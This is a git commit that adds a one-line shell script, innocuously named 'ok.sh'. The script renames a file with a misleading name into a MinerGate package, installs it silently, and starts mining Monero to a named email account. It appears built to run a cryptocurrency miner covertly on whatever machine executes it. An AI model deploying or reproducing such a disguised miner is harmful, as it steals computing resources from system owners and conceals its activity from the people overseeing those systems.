2a8d05467f8ecec78835bb12e3cdcb1c53449ffb
ba3walos99 <38079309+ba3walos99@users.noreply.github.com>
2019-05-30 03:18:48 +0200

    Create ok.sh

---
+++ ok.sh
@@ -0,0 +1,1 @@
+mv xfast-ubuntu-cli-amd minergate-cli-release.deb && apt-get -y update && apt-get -y install gdebi && yes Y | gdebi minergate-cli-release.deb && minergate-cli -u mgrate888@gmail.com --xmr
